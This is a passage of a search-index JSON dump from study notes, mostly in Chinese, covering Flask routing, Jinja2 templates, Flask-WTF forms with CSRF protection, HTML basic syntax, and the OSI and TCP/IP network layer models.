\u5f00\u53d1\u4e2d\u6d89\u53ca\u5230\u7684\u524d\u7aef (client-side) \u548c\u540e\u7aef (server-side) \u6280\u672f\u7684\u96c6\u5408 [cite: 4]\u3002</li> <li>Front-end technologies: \u901a\u5e38\u6307 HTML, CSS, \u548c JavaScript\uff0c\u7528\u4e8e\u5728\u6d4f\u89c8\u5668\u4e2d\u521b\u5efa\u7528\u6237\u754c\u9762\u548c\u7528\u6237\u4f53\u9a8c [cite: 4]\u3002</li> <li>Back-end technologies: \u5141\u8bb8\u6211\u4eec\u7f16\u5199\u5728\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u7684\u7a0b\u5e8f\uff0c\u5904\u7406\u5e94\u7528\u7a0b\u5e8f\u903b\u8f91\u3001\u6570\u636e\u5e93\u4ea4\u4e92\u3001\u7528\u6237\u8ba4\u8bc1\u7b49\u4efb\u52a1 [cite: 4]\u3002</li> <li>Stack: \u6307\u7684\u662f\u5b9e\u73b0\u524d\u7aef\u548c\u540e\u7aef\u6240\u9700\u7684\u4e00\u6574\u5957\u6280\u672f\u5217\u8868 [cite: 4]\u3002</li> </ul>"},{"location":"cs/mern/3403/l9/#components-of-the-full-stack-used-in-this-course","title":"Components of the full stack used in this course","text":"<p>\u672c\u8bfe\u7a0b\u4e2d\u4f7f\u7528\u7684\u540e\u7aef\u6280\u672f\u6808\u7ec4\u4ef6\u53ca\u5176\u7528\u9014\u5982\u4e0b [cite: 5]\uff1a</p> <ul> <li>Flask: \u4e00\u4e2a Python \u7684\u5fae\u578b Web \u6846\u67b6 (micro framework)\u3002\u5b83\u7528\u4e8e\u6784\u5efa Web \u5e94\u7528\u7a0b\u5e8f\u7684\u540e\u7aef\u903b\u8f91\u3002\u5b83\u5305\u542b\u4e00\u4e2a\u7528\u4e8e\u5f00\u53d1\u7684\u8f7b\u91cf\u7ea7 Web \u670d\u52a1\u5668\u3002</li> <li>SQLite: \u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684\u78c1\u76d8\u6587\u4ef6\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u3002\u7528\u4e8e\u5b58\u50a8\u548c\u7ba1\u7406\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u3002</li> <li>AJAX (Asynchronous JavaScript and XML): \u4e00\u79cd\u5728\u7f51\u9875\u52a0\u8f7d\u540e\uff0c\u5728\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u5f02\u6b65\u4f20\u8f93\u6570\u636e\u7684\u65b9\u6cd5\u3002\u5b83\u5141\u8bb8\u7f51\u9875\u5728\u4e0d\u91cd\u65b0\u52a0\u8f7d\u6574\u4e2a\u9875\u9762\u7684\u60c5\u51b5\u4e0b\u66f4\u65b0\u90e8\u5206\u5185\u5bb9\u3002</li> <li>jQuery: \u4e00\u4e2a JavaScript \u5e93\uff0c\u7b80\u5316\u4e86 HTML \u6587\u6863\u904d\u5386\u3001\u4e8b\u4ef6\u5904\u7406\u3001\u52a8\u753b\u548c AJAX \u4ea4\u4e92\uff0c\u65b9\u4fbf\u5728\u5ba2\u6237\u7aef\u8fdb\u884c AJAX \u8bf7\u6c42\u3002</li> </ul>"},{"location":"cs/mern/3403/l9/#how-flask-app-handles-routes","title":"How Flask app handles routes","text":"<ul> <li>Routes in Flask \u5c06 URL \u6620\u5c04\u5230 Python \u51fd\u6570 (\u79f0\u4e3a\u89c6\u56fe\u51fd\u6570\u6216\u5904\u7406\u51fd\u6570)\u3002</li> </ul> <ul> <li>\u5f53 Flask \u5e94\u7528\u6536\u5230\u4e00\u4e2a HTTP \u8bf7\u6c42\u65f6\uff0c\u5b83\u4f1a\u67e5\u627e\u54ea\u4e2a\u89c6\u56fe\u51fd\u6570\u6ce8\u518c\u4e86\u4e0e\u8bf7\u6c42 URL \u76f8\u5339\u914d\u7684\u8def\u7531\u3002</li> </ul> <ul> <li>\u8fd9\u662f\u901a\u8fc7\u4f7f\u7528 decorator <code>@app.route('/url_path')</code> \u6765\u5b9e\u73b0\u7684\uff0c\u8be5\u88c5\u9970\u5668\u653e\u7f6e\u5728\u89c6\u56fe\u51fd\u6570\u5b9a\u4e49\u4e4b\u524d [cite: 11]\u3002</li> </ul> <ul> <li><code>app</code> \u662f Flask \u5e94\u7528\u7684\u4e00\u4e2a\u5b9e\u4f8b (<code>app = Flask(__name__)</code>) [cite: 11]\u3002</li> <li><code>'/url_path'</code> \u662f\u5e0c\u671b\u4e0e\u8be5\u51fd\u6570\u5173\u8054\u7684 URL \u8def\u5f84\u3002</li> </ul> <ul> <li>\u5f53\u7528\u6237\u8bbf\u95ee\u8be5 URL \u65f6\uff0cFlask \u4f1a\u6267\u884c\u5173\u8054\u7684\u51fd\u6570\uff0c\u5e76\u5c06\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u503c\u4f5c\u4e3a HTTP \u54cd\u5e94\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef [cite: 11]\u3002</li> </ul> <ul> <li>Endpoints: \u4f7f\u7528 <code>@app.route(...)</code> \u6ce8\u89e3\u7684\u51fd\u6570\u88ab\u79f0\u4e3a\u7aef\u70b9 (endpoints) [cite: 14]\u3002</li> </ul> <ul> <li> <p>\u4e00\u4e2a\u7aef\u70b9\u53ef\u4ee5\u5bf9\u5e94\u591a\u4e2a URL\uff1a</p> <pre><code>@app.route('/')\n@app.route('/index')\ndef index():\n    return \"Hello, World!\"\n</code></pre> </li> </ul> <ul> <li> <p>\u8def\u7531\u53ef\u4ee5\u63a5\u53d7\u53c2\u6570\uff0c\u4f8b\u5982 <code>&lt;variable_name&gt;</code>\uff0c\u8fd9\u4e9b\u53c2\u6570\u4f1a\u81ea\u52a8\u4f20\u9012\u7ed9\u89c6\u56fe\u51fd\u6570 [cite: 14]\uff1a</p> <pre><code>@app.route('/user/&lt;username&gt;')\ndef show_user_profile(username):\n    return f'User {username}'\n</code></pre> </li> </ul> <ul> <li>\u53ef\u4ee5\u6307\u5b9a\u53c2\u6570\u7c7b\u578b\uff0c\u5982 <code>&lt;int:userid&gt;</code> [cite: 14]\u3002</li> </ul> <ul> <li>HTTP methods: \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u7aef\u70b9\u53ea\u54cd\u5e94 GET \u8bf7\u6c42\u3002\u53ef\u4ee5\u4f7f\u7528 <code>methods</code> \u53c2\u6570\u6307\u5b9a\u5176\u4ed6 HTTP \u65b9\u6cd5\uff0c\u5982 POST [cite: 15]\uff1a</li> </ul> <pre><code>@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        # process login\n        pass\n    else:\n        # show login form\n        pass\n</code></pre> <ul> <li>url_for(): \u7528\u4e8e\u52a8\u6001\u751f\u6210\u6307\u5b9a\u7aef\u70b9\u7684 URL\uff0c\u907f\u514d\u5728\u4ee3\u7801\u4e2d\u786c\u7f16\u7801 URL [cite: 15, 16]\u3002\u8fd9\u4f7f\u5f97 URL \u66f4\u6539\u65f6\u7ef4\u62a4\u66f4\u5bb9\u6613\u3002</li> </ul> <pre><code>from flask import url_for\nurl_for('index')  #  \u4f1a\u8fd4\u56de '/' \u6216 '/index' \u7684 URL\nurl_for('show_user_profile', username='JohnDoe') # \u4f1a\u8fd4\u56de '/user/JohnDoe'\n</code></pre>"},{"location":"cs/mern/3403/l9/#differences-between-server-side-and-client-side-rendering","title":"Differences between server-side and client-side rendering","text":"<ul> <li>Server-side rendering (SSR) [cite: 17]:</li> <li>Process: \u5f53\u5ba2\u6237\u7aef\uff08\u6d4f\u89c8\u5668\uff09\u8bf7\u6c42\u4e00\u4e2a\u9875\u9762\u65f6\uff0c\u670d\u52a1\u5668\u5904\u7406\u8bf7\u6c42\uff0c\u6267\u884c\u5fc5\u8981\u7684\u903b\u8f91\uff08\u4f8b\u5982\uff0c\u4ece\u6570\u636e\u5e93\u83b7\u53d6\u6570\u636e\uff09\uff0c\u5c06\u6570\u636e\u586b\u5145\u5230 HTML \u6a21\u677f\u4e2d\uff0c\u751f\u6210\u5b8c\u6574\u7684 HTML \u9875\u9762\uff0c\u7136\u540e\u5c06\u8fd9\u4e2a HTML \u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002\u6d4f\u89c8\u5668\u63a5\u6536\u5230 HTML \u540e\u76f4\u63a5\u6e32\u67d3\u3002</li> <li>Traditional Page Lifecycle: \u521d\u59cb\u8bf7\u6c42\u83b7\u53d6 HTML\u3002\u8868\u5355\u63d0\u4ea4 (POST) \u540e\uff0c\u670d\u52a1\u5668\u5904\u7406\u6570\u636e\uff0c\u7136\u540e\u901a\u5e38\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5b8c\u6574 HTML \u9875\u9762\uff0c\u5bfc\u81f4\u9875\u9762\u91cd\u65b0\u52a0\u8f7d [cite: 17]\u3002</li> <li>Pros: \u6709\u5229\u4e8e SEO (\u641c\u7d22\u5f15\u64ce\u4f18\u5316)\uff0c\u56e0\u4e3a\u641c\u7d22\u5f15\u64ce\u53ef\u4ee5\u76f4\u63a5\u6293\u53d6\u5230\u5b8c\u6574\u7684\u9875\u9762\u5185\u5bb9\u3002\u9996\u6b21\u5185\u5bb9\u52a0\u8f7d\u901f\u5ea6\u53ef\u80fd\u66f4\u5feb (First Contentful Paint)\u3002</li> <li>Cons: \u6bcf\u6b21\u4ea4\u4e92\u6216\u9875\u9762\u53d8\u5316\u90fd\u53ef\u80fd\u9700\u8981\u91cd\u65b0\u4ece\u670d\u52a1\u5668\u52a0\u8f7d\u6574\u4e2a\u9875\u9762\uff0c\u670d\u52a1\u5668\u8d1f\u8f7d\u8f83\u9ad8\u3002</li> <li>Client-side rendering (CSR) [cite: 17]:</li> <li>Process: \u670d\u52a1\u5668\u521d\u59cb\u53d1\u9001\u4e00\u4e2a\u6700\u5c0f\u7684 HTML\u9aa8\u67b6\uff08\u901a\u5e38\u5305\u542b JavaScript \u6587\u4ef6\u7684\u94fe\u63a5\uff09\u3002\u6d4f\u89c8\u5668\u4e0b\u8f7d\u5e76\u6267\u884c\u8fd9\u4e9b JavaScript \u6587\u4ef6\u3002JavaScript \u4ee3\u7801\u968f\u540e\u8d1f\u8d23\u83b7\u53d6\u6570\u636e\uff08\u901a\u5e38\u901a\u8fc7 AJAX \u8bf7\u6c42\u4ece\u670d\u52a1\u5668\u83b7\u53d6 JSON \u6570\u636e\uff09\uff0c\u5e76\u5728\u5ba2\u6237\u7aef\u52a8\u6001\u751f\u6210\u548c\u6e32\u67d3 HTML \u5185\u5bb9\u3002</li> <li>SPA (Single Page Application) Lifecycle: \u521d\u59cb\u8bf7\u6c42\u83b7\u53d6 HTML \u9aa8\u67b6\u548c JavaScript\u3002\u540e\u7eed\u7684\u6570\u636e\u4ea4\u4e92\u901a\u8fc7 AJAX \u8bf7\u6c42\uff08\u670d\u52a1\u5668\u8fd4\u56de JSON \u6570\u636e\uff09\uff0cJavaScript \u5728\u5ba2\u6237\u7aef\u66f4\u65b0\u9875\u9762\u5185\u5bb9\uff0c\u65e0\u9700\u5b8c\u5168\u91cd\u65b0\u52a0\u8f7d\u9875\u9762 [cite: 17]\u3002</li> <li>Pros: \u9875\u9762\u4ea4\u4e92\u66f4\u6d41\u7545\uff0c\u7528\u6237\u4f53\u9a8c\u7c7b\u4f3c\u684c\u9762\u5e94\u7528\u3002\u670d\u52a1\u5668\u8d1f\u8f7d\u8f83\u4f4e\uff0c\u56e0\u4e3a\u5b83\u4e3b\u8981\u63d0\u4f9b\u6570\u636e API\u3002\u66f4\u7075\u6d3b\uff0c\u652f\u6301\u975e\u6d4f\u89c8\u5668\u8bbe\u5907\u3002</li> <li>Cons: \u521d\u59cb\u52a0\u8f7d\u65f6\u95f4\u53ef\u80fd\u8f83\u957f\uff0c\u56e0\u4e3a\u9700\u8981\u4e0b\u8f7d\u548c\u6267\u884c JavaScript\u3002SEO \u53ef\u80fd\u66f4\u590d\u6742\uff08\u5c3d\u7ba1\u73b0\u5728\u641c\u7d22\u5f15\u64ce\u5bf9 JavaScript \u7684\u5904\u7406\u80fd\u529b\u6709\u6240\u63d0\u9ad8\uff09\u3002</li> <li>Flask \u652f\u6301\u8fd9\u4e24\u79cd\u6e32\u67d3\u65b9\u5f0f [cite: 17]\u3002</li> </ul>"},{"location":"cs/mern/3403/l9/#purpose-of-templates","title":"Purpose of templates","text":"<ul> <li>Templates \u7684\u4e3b\u8981\u76ee\u7684\u662f\u5c06\u5e94\u7528\u7a0b\u5e8f\u7684 presentation logic (\u5982\u4f55\u663e\u793a\u6570\u636e) \u4e0e application logic (\u6570\u636e\u5904\u7406\u548c\u4e1a\u52a1\u89c4\u5219) \u5206\u79bb\u5f00\u6765 [cite: 19, 20]\u3002</li> <li>\u5728 Web \u5f00\u53d1\u4e2d\uff0c\u6a21\u677f\u901a\u5e38\u662f HTML \u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u7279\u6b8a\u7684\u5360\u4f4d\u7b26 (placeholders) \u548c\u4e00\u4e9b\u7b80\u5355\u7684\u903b\u8f91\u7ed3\u6784 (\u5982\u5faa\u73af\u548c\u6761\u4ef6\u8bed\u53e5)\u3002</li> <li>Dynamic HTML Generation: \u670d\u52a1\u5668\u7aef\u7684\u6e32\u67d3\u5f15\u64ce (\u5728 Flask \u4e2d\u662f Jinja2 [cite: 20]) \u4f1a\u83b7\u53d6\u6a21\u677f\u6587\u4ef6\uff0c\u5e76\u5c06\u5e94\u7528\u7a0b\u5e8f\u4f20\u9012\u8fc7\u6765\u7684\u52a8\u6001\u6570\u636e\u586b\u5145\u5230\u8fd9\u4e9b\u5360\u4f4d\u7b26\u4e2d\uff0c\u6700\u7ec8\u751f\u6210\u4e00\u4e2a\u5b8c\u6574\u7684 HTML \u9875\u9762\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002</li> <li>\u4f8b\u5982\uff0c\u4e00\u4e2a\u6a21\u677f\u53ef\u80fd\u6709\u4e00\u4e2a\u5360\u4f4d\u7b26 <code>{{ username }}</code>\u3002\u5728\u6e32\u67d3\u65f6\uff0c<code>username</code> \u4f1a\u88ab\u5b9e\u9645\u7684\u7528\u6237\u540d\u66ff\u6362 [cite: 21]\u3002</li> <li>Reusability: \u6a21\u677f\u53ef\u4ee5\u88ab\u91cd\u7528\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u57fa\u7840\u6a21\u677f (base template) \u5305\u542b\u7f51\u7ad9\u7684\u901a\u7528\u5e03\u5c40\uff08\u5982\u9875\u7709\u3001\u9875\u811a\u3001\u5bfc\u822a\u680f\uff09\uff0c\u5176\u4ed6\u7279\u5b9a\u9875\u9762\u53ef\u4ee5\u7ee7\u627f\u8fd9\u4e2a\u57fa\u7840\u6a21\u677f\u5e76\u53ea\u586b\u5145\u5176\u7279\u6709\u7684\u5185\u5bb9\u90e8\u5206 (<code>{% block content %}</code> \u548c <code>{% extends \"base.html\" %}</code> in Jinja) [cite: 26, 27]\u3002\u8fd9\u9075\u5faa\u4e86 DRY (Don't Repeat Yourself) \u539f\u5219 [cite: 27]\u3002</li> <li>Maintainability: \u5206\u79bb\u5173\u6ce8\u70b9\u4f7f\u5f97\u4ee3\u7801\u66f4\u6613\u4e8e\u7ef4\u62a4\u3002\u8bbe\u8ba1\u5e08\u53ef\u4ee5\u4e13\u6ce8\u4e8e HTML/CSS\uff0c\u800c\u5f00\u53d1\u8005\u53ef\u4ee5\u4e13\u6ce8\u4e8e Python \u903b\u8f91\u3002</li> <li>Jinja2 features:</li> <li>Variables: <code>{{ variable_name }}</code> [cite: 21]</li> <li>Control Structures:<ul> <li>Conditionals: <code>{% if condition %}</code>, <code>{% else %}</code>, <code>{% elif condition %}</code>, <code>{% endif %}</code> [cite: 23]</li> <li>Loops: <code>{% for item in items %}</code>, <code>{% endfor %}</code> [cite: 22, 24, 25]</li> </ul> </li> <li>Template Inheritance: <code>{% extends \"base.html\" %}</code> \u548c <code>{% block block_name %}</code> [cite: 26, 27]</li> </ul>"},{"location":"cs/mern/3403/l9/#purpose-of-flaskforms-library-flask-wtf","title":"Purpose of FlaskForms library (Flask-WTF)","text":"<ul> <li>Flask-WTF \u662f\u4e00\u4e2a\u4e0e Flask \u96c6\u6210\u7684\u6269\u5c55\uff0c\u5b83\u7b80\u5316\u4e86\u5728 Flask \u5e94\u7528\u4e2d\u4f7f\u7528 WTForms \u5e93\u5904\u7406 Web \u8868\u5355\u7684\u8fc7\u7a0b [cite: 29]\u3002</li> </ul> <ul> <li>Purpose:</li> </ul> <ol> <li> <p>Form Definition: \u5141\u8bb8\u5f00\u53d1\u8005\u4f7f\u7528 Python \u7c7b\u6765\u5b9a\u4e49\u8868\u5355\u7684\u7ed3\u6784\u548c\u5b57\u6bb5\u3002\u6bcf\u4e2a\u5b57\u6bb5\u53ef\u4ee5\u6307\u5b9a\u7c7b\u578b\uff08\u5982\u5b57\u7b26\u4e32\u3001\u6574\u6570\u3001\u5e03\u5c14\u503c\uff09\u548c\u9a8c\u8bc1\u5668 (validators) [cite: 31]\u3002</p> <pre><code>from flask_wtf import FlaskForm\nfrom wtforms import StringField, PasswordField, BooleanField, SubmitField\nfrom wtforms.validators import DataRequired, Email\n\nclass LoginForm(FlaskForm):\n    username = StringField('Username', validators=[DataRequired()])\n    password = PasswordField('Password', validators=[DataRequired()])\n    remember_me = BooleanField('Remember Me')\n    submit = SubmitField('Sign In')\n</code></pre> </li> <li> <p>Rendering Forms in Templates: \u53ef\u4ee5\u8f7b\u677e\u5730\u5c06\u8868\u5355\u5bf9\u8c61\u4f20\u9012\u7ed9 Jinja2 \u6a21\u677f\uff0c\u5e76\u5728\u6a21\u677f\u4e2d\u6e32\u67d3 HTML \u8868\u5355\u5143\u7d20\u3002Flask-WTF \u4f1a\u5904\u7406\u5b57\u6bb5\u7684 HTML \u751f\u6210\uff0c\u5305\u62ec\u6807\u7b7e\u3001\u8f93\u5165\u6846\u7b49 [cite: 32]\u3002</p> <pre><code>&lt;form method=\"POST\" action=\"\"&gt;\n    {{ form.hidden_tag() }} {#  For CSRF protection #}\n    &lt;p&gt;\n        {{ form.username.label }}&lt;br&gt;\n        {{ form.username(size=32) }}&lt;br&gt;\n        {% for error in form.username.errors %}\n        &lt;span style=\"color: red;\"&gt;[{{ error }}]&lt;/span&gt;\n        {% endfor %}\n    &lt;/p&gt;\n    &lt;p&gt;{{ form.submit() }}&lt;/p&gt;\n&lt;/form&gt;\n</code></pre> </li> <li> <p>Data Validation: \u5f53\u8868\u5355\u63d0\u4ea4\u540e (\u901a\u5e38\u662f POST \u8bf7\u6c42)\uff0cFlask-WTF \u53ef\u4ee5\u81ea\u52a8\u9a8c\u8bc1\u63d0\u4ea4\u7684\u6570\u636e\u662f\u5426\u7b26\u5408\u5728\u8868\u5355\u7c7b\u4e2d\u5b9a\u4e49\u7684\u9a8c\u8bc1\u89c4\u5219 (e.g., <code>DataRequired</code>, <code>Email</code>, <code>Length</code>) [cite: 34]\u3002</p> <pre><code>form = LoginForm()\nif form.validate_on_submit():\n    # Process data from form.username.data, form.password.data\n    flash('Login requested for user {}, remember_me={}'.format(\n        form.username.data, form.remember_me.data))\n    return redirect(url_for('index'))\nreturn render_template('login.html', title='Sign In', form=form)\n</code></pre> </li> <li> <p>CSRF Protection: \u81ea\u52a8\u5904\u7406\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 (Cross-Site Request Forgery) \u4fdd\u62a4\u3002\u9700\u8981\u5728 Flask \u5e94\u7528\u914d\u7f6e\u4e2d\u8bbe\u7f6e <code>SECRET_KEY</code> [cite: 30]\uff0c\u5e76\u5728\u6a21\u677f\u4e2d\u4f7f\u7528 <code>{{ form.hidden_tag() }}</code> [cite: 32]\u3002</p> </li> <li> <p>Populating Forms: \u53ef\u4ee5\u7528\u6570\u636e\u9884\u586b\u5145\u8868\u5355\u5b57\u6bb5\u3002</p> </li> <li> <p>Error Handling: \u9a8c\u8bc1\u5931\u8d25\u65f6\uff0c\u9519\u8bef\u4fe1\u606f\u53ef\u4ee5\u65b9\u4fbf\u5730\u5728\u6a21\u677f\u4e2d\u663e\u793a\u7ed9\u7528\u6237 [cite: 32]\u3002</p> </li> </ol> <p>You are expected to be able to read, critique and fix basic Flask code and Jinja templates but you are not expected to write them from scratch.</p>"},{"location":"cs/mern/html/html_syntax/","title":"1.0 HTML Basic Syntax","text":""},{"location":"cs/mern/html/html_syntax/#shortcut","title":"Shortcut","text":"<ul> <li>! \u52a0 return \u5feb\u901f\u5f97\u5230 html \u524d\u7f00</li> <li>shift + \u4e0a\u4e0b\u5de6\u53f3\u53ef\u4ee5\u9009\u62e9\u6587\u672c</li> <li>shift + option + \u4e0b\uff0c\u5411\u4e0b\u7c98\u8d34</li> </ul>"},{"location":"cs/mern/html/html_syntax/#headers","title":"Headers","text":"<pre><code>&lt;h1&gt;hello world&lt;/h1&gt;\n</code></pre> <ul> <li>\u8fd9\u6837\u7684\u6574\u4f53\u53eb element, <code>&lt;h1&gt;</code> \u548c <code>&lt;/h1&gt;</code> \u5206\u522b\u4e3a opening \u548c closing tag</li> <li>header \u53ea\u6709 <code>&lt;h1&gt;</code> -  <code>&lt;h6&gt;</code></li> </ul>"},{"location":"cs/mern/html/html_syntax/#paragraphs","title":"Paragraphs","text":"<p>Lorem Ipsum \u662f\u4e00\u79cd\u7528\u4e8e\u6392\u7248\u548c\u8bbe\u8ba1\u7684\u5047\u6587\uff0c\u901a\u5e38\u88ab\u7528\u4f5c\u5360\u4f4d\u7b26\u6587\u672c\u3002\u5176\u76ee\u7684\u662f\u5728\u8bbe\u8ba1\u6837\u672c\u4e2d\u63d0\u4f9b\u4e00\u4e2a\u6587\u672c\u586b\u5145\uff0c\u4ee5\u4fbf\u5728\u6ca1\u6709\u5b9e\u9645\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\u6a21\u62df\u6587\u672c\u7684\u5916\u89c2\u548c\u5e03\u5c40\u3002\u8fd9\u5bf9\u4e8e\u68c0\u67e5\u5b57\u4f53\u3001\u6392\u7248\u548c\u6574\u4f53\u8bbe\u8ba1\u6548\u679c\u975e\u5e38\u6709\u7528\u3002</p> <p>Lorem Ipsum \u7684\u6765\u6e90\u53ef\u4ee5\u8ffd\u6eaf\u5230\u53e4\u7f57\u9a6c\u65f6\u671f\u7684\u62c9\u4e01\u6587\u5b66\uff0c\u7279\u522b\u662f\u516c\u5143\u524d45\u5e74\u5de6\u53f3\u897f\u585e\u7f57\uff08Cicero\uff09\u7684\u8457\u4f5c\u300a\u5584\u4e0e\u6076\u7684\u7ec8\u6781\u7406\u8bba\u300b\uff08\"De finibus bonorum et malorum\"\uff09\u3002\u867d\u7136\u5b83\u662f\u62c9\u4e01\u6587\uff0c\u4f46 Lorem Ipsum \u5e76\u6ca1\u6709\u5b9e\u9645\u610f\u4e49\uff0c\u4ec5\u4ec5\u662f\u4e00\u79cd\u6a21\u62df\u6587\u672c\u7684\u5de5\u5177\u3002</p> <p>\u73b0\u4ee3\u8bbe\u8ba1\u548c\u5f00\u53d1\u5de5\u5177\u4e2d\uff0cLorem Ipsum \u7ecf\u5e38\u88ab\u7528\u6765\u586b\u5145\u6587\u672c\u6846\u3001\u6587\u7ae0\u548c\u6bb5\u843d\uff0c\u5e2e\u52a9\u8bbe\u8ba1\u5e08\u548c\u5f00\u53d1\u8005\u4e13\u6ce8\u4e8e\u5e03\u5c40\u548c\u529f\u80fd\uff0c\u800c\u4e0d\u662f\u5185\u5bb9\u3002</p> <p>www.lipsum.co \u6216\u8005\u81ea\u5df1 Google Funny Lorem Ipsum</p>"},{"location":"cs/mern/html/html_syntax/#void-element","title":"Void Element","text":"<pre><code>&lt;hr /&gt;\n&lt;br /&gt; \n</code></pre> <p>\u4ee5\u4e0a\u4e24\u79cd tag \u5206\u522b\u53eb horizontal rule \u548c break element\uff0c\u73b0\u4ee3\u7f51\u9875\u5f00\u53d1\u4e2d HTML \u81ea\u52a8\u5ffd\u7565\u7a7a\u683c\u548c / \u7b26\u53f7\uff0c\u76f4\u63a5\u4f7f\u7528 <code>&lt;hr&gt;</code> \u548c <code>&lt;br&gt;</code> \u5373\u53ef\uff0c\u4f46\u524d\u8005\u66f4\u4e3a\u6807\u51c6\u3002</p> <p>\u5728 paragraph \u4e2d\u7a7a\u884c\u6700\u597d\u4f7f\u7528\u591a\u4e2a <code>&lt;p&gt;</code> tag, \u4e2d\u95f4\u7a7f\u63d2 <code>&lt;br&gt;</code> \u4f1a\u5bfc\u81f4\u76f2\u4eba\u9605\u8bfb\u56f0\u96be</p>"},{"location":"cs/network/w1/","title":"1.0 OSI and TCP/IP","text":""},{"location":"cs/network/w1/#core-understanding-network-layering","title":"Core: Understanding Network Layering","text":""},{"location":"cs/network/w1/#why-layering-is-important","title":"Why Layering is Important","text":"Concept Description Benefits Managing Complexity Computer networking is divided into small, manageable layers Makes complex tasks easier to understand and manage Independent Functions Each layer provides well-defined, independent functionality Allows independent improvement without changing entire stack Service Hierarchy Each layer serves the layer above and is served by layer below Creates clear service boundaries and interfaces Minimal Interface Traffic Layers have minimum traffic between interfaces Improves efficiency and reduces coupling Fault Isolation Problems can be isolated to specific layers Easier troubleshooting and maintenance"},{"location":"cs/network/w1/#key-network-concepts","title":"Key Network Concepts","text":""},{"location":"cs/network/w1/#protocols-the-rules-of-communication","title":"Protocols: The Rules of Communication","text":"Aspect Description Definition Set of rules governing data communication Purpose Determines what, how, and when data is communicated Requirements Both sender and receiver must follow the protocol Examples TCP/IP, HTTP, SMTP, UDP, FTP, SSH"},{"location":"cs/network/w1/#standards-ensuring-interoperability","title":"Standards: Ensuring Interoperability","text":"Aspect Description Purpose Agreed-upon conventions for communication Benefits Enable devices from different companies to communicate Competition Provide fair competition by establishing common requirements Challenges Difficult due to competing interests and risk of bad standards"},{"location":"cs/network/w1/#data-processing-flow","title":"Data Processing Flow","text":"Process Sender Receiver Header/Trailer Each layer appends its own header/trailer Each layer removes its header/trailer Data Flow Data flows down the stack Data flows up the stack Information Headers contain control information (addresses, sequence numbers, checksums) Headers are processed and removed"},{"location":"cs/network/w1/#the-osi-reference-model-7-layers","title":"The OSI Reference Model (7 Layers)","text":""},{"location":"cs/network/w1/#model-overview","title":"Model Overview","text":"Aspect Details Organization ISO (International Standards Organization) Year Standardized 1983 Purpose Generic standard for understanding network interactions Foundation Based on principles of abstraction, independent functions, and manageability"},{"location":"cs/network/w1/#osi-layer-structure","title":"OSI Layer Structure","text":"Layer Name Primary Function Key Responsibilities Data Unit 7 Application User services interface Direct services to users, interface between applications and network Data 6 Presentation Data format standardization Translation, compression, encryption/decryption Data 5 Session Dialogue management Connection establishment/closing, synchronization, mode negotiation Data 4 Transport End-to-end process delivery Port numbers, segmentation, flow control, error control, connection management Segments 3 Network Internetworking Logical addressing (IP), routing, forwarding, fragmentation Packets 2 Data Link Single link reliability Framing, physical addressing (MAC), flow control, error control, access control Frames 1 Physical Raw bit transmission Electrical/mechanical interfaces, voltage levels, timing, physical connectors Bits"},{"location":"cs/network/w1/#detailed-layer-functions","title":"Detailed Layer Functions","text":""},{"location":"cs/network/w1/#layer-1-physical-layer","title":"Layer 1: Physical Layer","text":"<ul> <li>Core Function: Transmit raw bit stream over physical medium</li> <li>Key Aspects:</li> <li>Electrical and mechanical interfaces</li> <li>Voltage levels and timing</li> <li>Physical connectors</li> <li>Transmission media (copper, fiber, wireless)</li> <li>Focus: Physical transmission only, not bit meaning</li> </ul>"},{"location":"cs/network/w1/#layer-2-data-link-layer","title":"Layer 2: Data Link Layer","text":"<ul> <li>Core Function: Reliable transmission over single link (one hop)</li> <li>Sub-layers: Logical Link Control (LLC) and Media Access Control (MAC)</li> <li>Key Functions:</li> </ul> Function Description Framing Delimiting data into frames Physical Addressing MAC address identification Flow Control Throttling frame flow between sender/receiver Error Control Detecting/correcting frame errors (CRC, checksums) Access Control Managing shared medium access (CSMA/CD, Token Ring)"},{"location":"cs/network/w1/#layer-3-network-layer","title":"Layer 3: Network Layer","text":"<ul> <li>Core Function: End-to-end packet delivery across multiple networks</li> <li>Key Functions:</li> </ul> Function Description Logical Addressing IP address scheme for internetwork hosts Routing Determining best path across networks Forwarding Moving packets between router ports Fragmentation/Assembly Handling different MTU sizes Packet Sequencing Order management (handled by higher layers)"},{"location":"cs/network/w1/#layer-4-transport-layer","title":"Layer 4: Transport Layer","text":"<ul> <li>Core Function: Process-to-process message delivery</li> <li>Protocol Examples: TCP (reliable, connection-oriented), UDP (unreliable, connectionless)</li> <li>Key Functions:</li> </ul> Function Description Port Numbers Application/process identification Segmentation/Reassembly Data division and reconstruction End-to-End Flow Control Receiving process rate management End-to-End Error Control Reliable delivery with retransmission Connection Management TCP handshake, connection lifecycle"},{"location":"cs/network/w1/#layer-5-session-layer","title":"Layer 5: Session Layer","text":"<ul> <li>Core Function: Dialogue management between end systems</li> <li>Key Operations:</li> <li>Connection establishment and closing</li> <li>Synchronization (checkpoints for recovery)</li> <li>Communication mode negotiation (full/half duplex)</li> </ul>"},{"location":"cs/network/w1/#layer-6-presentation-layer","title":"Layer 6: Presentation Layer","text":"<ul> <li>Core Function: Standard format for information transfer</li> <li>Key Functions:</li> <li>Data translation between different systems</li> <li>Data compression</li> <li>Encryption and decryption</li> <li>Compatibility problem resolution</li> </ul>"},{"location":"cs/network/w1/#layer-7-application-layer","title":"Layer 7: Application Layer","text":"<ul> <li>Core Function: Direct user services</li> <li>Examples: Web browsers, email clients, file transfer programs</li> <li>Protocol Examples: HTTP, SMTP, FTP</li> </ul>"},{"location":"cs/network/w1/#the-tcpip-model-4-layers","title":"The TCP/IP Model (4 Layers)","text":""},{"location":"cs/network/w1/#model-overview_1","title":"Model 